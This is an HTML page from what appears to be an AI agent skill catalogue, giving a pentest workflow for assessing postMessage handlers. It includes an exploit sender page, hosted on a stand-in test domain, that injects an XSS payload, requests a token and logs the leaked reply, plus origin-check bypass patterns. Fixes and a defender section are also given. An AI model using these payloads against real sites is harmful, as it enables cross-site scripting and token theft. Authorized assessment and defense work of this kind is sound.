@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: postmessage-security</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../index.html#agents">Agents</a>
+<a href="../index.html#brains">Brains</a>
+<a href="../index.html#playbooks">Playbooks</a>
+<a href="../index.html#decisions">Decisions</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>postmessage-security</h2><div class="meta"><span class="badge gray">web</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">95/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when assessing postMessage communication between</p><div class="deps"><span class="kind">requires:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="web-xss.html">web-xss</a> <a href="cors-misconfig.html">cors-misconfig</a> <a href="dom-clobbering.html">dom-clobbering</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>Burp Suite</td><td>2026.2</td></tr><tr><td>Python</td><td>3.12</td></tr></tbody></table><p>postMessage lets windows talk across origins, and handlers that skip origin checks let any site talk to your page: steal tokens, trigger actions, or leak data. This skill covers authorized assessment: finding message handlers, testing origin validation, and proving impact with a malicious sender page you host in the test environment.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Find every message listener: search JS for addEventListener with</li>
+<p>&#x27;message&#x27;.</p>
+<li>Read each handler: does it check event.origin, and against what.</li>
+<li>Map what the handler does with event.data: DOM writes, token use,</li>
+<p>navigation, eval.</p>
+<li>Build a sender page on your test domain that posts crafted</li>
+<p>messages to the target.</p>
+<li>Prove the impact: data exfiltration, action invocation, or XSS.</li>
+<li>Check the reverse direction: what the target posts outward and to</li>
+<p>which origins.</p>
+<li>Review origin allowlists for bypasses (subdomain, suffix match).</li>
+<li>Document the handler code, the missing check, and the working</li>
+<p>exploit page.</p>
+</ol>
+<h2>1. Handler discovery and review</h2>
+<pre><code class="language-bash"># Find listeners in the app&#x27;s JavaScript
+grep -rn &quot;addEventListener([&#x27;\&quot;]message&quot; /tmp/app.js | head -20
+# For each, read the handler and answer:
+# 1. is event.origin checked? 2. against an exact string or a regex?
+# 3. is event.source verified? 4. is event.data validated before use?</code></pre>
+<pre><code class="language-javascript">// VULNERABLE: no origin check
+window.addEventListener(&#x27;message&#x27;, (e) =&gt; {
+  document.getElementById(&#x27;out&#x27;).innerHTML = e.data.html; // XSS from any origin
+});
+
+// FIXED: strict origin check plus data validation
+const TRUSTED = &#x27;https://widget.example&#x27;;
+window.addEventListener(&#x27;message&#x27;, (e) =&gt; {
+  if (e.origin !== TRUSTED) return;
+  if (typeof e.data.html !== &#x27;string&#x27;) return;
+  document.getElementById(&#x27;out&#x27;).textContent = e.data.html;
+});</code></pre>
+<h2>2. Exploit sender page (test environment)</h2>
+<pre><code class="language-html">&lt;!-- Host on https://evil-test.example (your test domain) --&gt;
+&lt;iframe src=&quot;https://target.example/widget&quot; id=&quot;t&quot;&gt;&lt;/iframe&gt;
+&lt;script&gt;
+// Wait for load, then post the malicious message
+window.onload = () =&gt; {
+  const t = document.getElementById(&#x27;t&#x27;).contentWindow;
+  // No origin check on the target? use &#x27;*&#x27; or the target origin
+  t.postMessage({html: &#x27;&lt;img src=x onerror=alert(document.domain)&gt;&#x27;}, &#x27;*&#x27;);
+  // For data theft handlers: ask it to send data back and listen
+  window.addEventListener(&#x27;message&#x27;, (e) =&gt; {
+    console.log(&#x27;leaked back:&#x27;, e.data);
+  });
+  t.postMessage({action: &#x27;getToken&#x27;}, &#x27;*&#x27;);
+};
+&lt;/script&gt;</code></pre>
+<pre><code class="language-bash"># Origin validation bypass patterns to test where a check exists:
+# - e.origin check against &#x27;https://app.example&#x27; bypassed by
+#   &#x27;https://app.example.evil.com&#x27; if the check is a substring match
+# - null origin (sandboxed iframe) accepted by sloppy checks
+# - postMessage to &#x27;*&#x27; on the sending side leaks data to any embedder
+grep -rn &quot;postMessage(.*&#x27;\*&#x27;&quot; /tmp/app.js | head -10</code></pre>
+<h2>Edge cases</h2>
+<ul>
+<li>The handler checks origin but the allowlist is data driven. Find</li>
+<p>where the allowlist comes from; a user controlled list is no allowlist.</p>
+<li>Messages are validated with a schema but origin is not checked.</li>
+<p>Schema validation does not replace origin checks; test both.</p>
+<li>The flow needs user interaction (click). Your sender page can</li>
+<p>include the clickjacking step; note the interaction requirement.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>Handler is safe but the sender uses &#x27;*&#x27;: the leak goes the other</li>
+<p>way; embed the target and harvest what it broadcasts.</p>
+<li>Multiple handlers: test each; one weak handler is enough.</li>
+<li>postMessage is fine: check related vectors (CORS, window.name)</li>
+<p>before closing the area.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders see postMessage attacks as unexpected cross origin iframes and messages, detectable in client telemetry when instrumented. The durable fix is boring and effective: check event.origin against an exact allowlist in every handler, validate event.data shape, and never postMessage sensitive data to &#x27;*&#x27;. Code review checklists should flag every new message listener.</p>
+<h2>Key references</h2>
+<ul>
+<li>CWE-942 (Overly Permissive Cross-domain Whitelist).</li>
+<li>CWE-79 (Cross-site Scripting): the common escalation.</li>
+<li>HTML Living Standard: postMessage security considerations.</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
